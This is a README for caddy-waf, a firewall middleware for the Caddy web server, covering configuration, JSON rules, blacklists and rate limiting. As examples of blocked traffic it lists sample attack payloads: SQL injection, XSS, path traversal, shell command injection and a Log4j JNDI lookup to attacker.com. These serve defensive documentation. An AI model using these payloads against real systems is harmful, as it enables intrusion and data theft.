# Caddy WAF Middleware

A Web Application Firewall (WAF) middleware for Caddy server with rule-based filtering, blacklisting, and rate limiting.

## Features
- Rule-based request filtering with regex patterns
- IP and DNS blacklisting
- Rate limiting per IP address
- Anomaly scoring system
- Request inspection (URL, args, body, headers)
- Protection against common attacks (SQL injection, XSS, RCE, etc.)
- Detailed logging support

## Installation

```bash
xcaddy build --with github.com/fabriziosalmi/caddy-waf
```

## Configuration

Basic Caddyfile setup:

```caddyfile
localhost {
    route {
        waf {
            rule_file rules.json
            ip_blacklist_file blacklist.txt
            dns_blacklist_file domains.txt
            rate_limit 100 1m  # 100 requests per minute
            log_all
            anomaly_threshold 5
        }
        respond "Hello, world!"
    }
}
```

### Protected Attacks Examples

The WAF protects against various attacks. Here are examples that would be blocked:

#### SQL Injection
```http
# Blocked: Basic SELECT injection
GET /?id=1 SELECT * FROM users

# Blocked: UNION-based injection
GET /?id=1 UNION SELECT username,password FROM users

# Blocked: Time-based injection
GET /?id=1' AND SLEEP(5)--
```

#### Cross-Site Scripting (XSS)
```http
# Blocked: Basic script injection
GET /?input=<script>alert(1)</script>

# Blocked: Event handler injection
GET /?input=<img onerror=alert(1) src=x>

# Blocked: SVG-based XSS
GET /?input=<svg/onload=alert(1)>
```

#### Path Traversal
```http
# Blocked: Directory traversal
GET /../../etc/passwd

# Blocked: Encoded traversal
GET /%2e%2e%2f/etc/passwd

# Blocked: Double-encoded traversal
GET /%252e%252e%252f/etc/passwd
```

#### Remote Code Execution
```http
# Blocked: Command injection
GET /?cmd=;ls;

# Blocked: Shell command
GET /?input=`cat /etc/passwd`

# Blocked: System command execution
GET /?input=$(ls -la)
```

#### Log4j Attacks
```http
# Blocked: JNDI lookup
GET /?x=${jndi:ldap://attacker.com/a}

# Blocked: Nested expression
GET /?x=${${::-j}${::-n}${::-d}${::-i}}
```

#### Protocol Attacks
```http
# Blocked: Git repository access
GET /.git/config

# Blocked: Environment file access
GET /.env

# Blocked: Apache configuration
GET /.htaccess
```

#### Scanner Detection
```http
# Blocked: Common scanner User-Agents
User-Agent: sqlmap/1.4.7
User-Agent: nikto/2.1.6
User-Agent: nmap/7.80
```

### Configuration Options

- `rule_file`: JSON file containing WAF rules
- `ip_blacklist_file`: File with blocked IPs/CIDR ranges
- `dns_blacklist_file`: File with blocked domains
- `rate_limit <requests> <window>`: Rate limiting (e.g., "100 1m" for 100 requests per minute)
- `log_all`: Enable detailed logging
- `anomaly_threshold`: Cumulative score threshold (default: 5)

### Rules Format (rules.json)

```json
[
    {
        "id": "sql_injection",
        "phase": 2,
        "pattern": "(?i)select.*from",
        "targets": ["ARGS", "BODY"],
        "severity": "HIGH",
        "action": "block",
        "score": 3
    }
]
```

### Blacklist Formats
- `ip_blacklist.txt`: One IP/CIDR per line
- `dns_blacklist.txt`: One domain per line

## Rate Limiting

Rate limiting is configured with two parameters:
- Number of requests allowed
- Time window

Example configurations:
```caddyfile
# 100 requests per minute
rate_limit 100 1m

# 10 requests per second
rate_limit 10 1s

# 1000 requests per hour
rate_limit 1000 1h
```

Exceeding the rate limit returns HTTP 429 (Too Many Requests).

## Testing

Test rate limiting:
```bash
# Test 5 requests per 5 seconds limit
for i in {1..6}; do curl -i http://localhost:8080/; done

# Load test
ab -n 100 -c 10 http://localhost:8080/
```

## License

AGPLv3
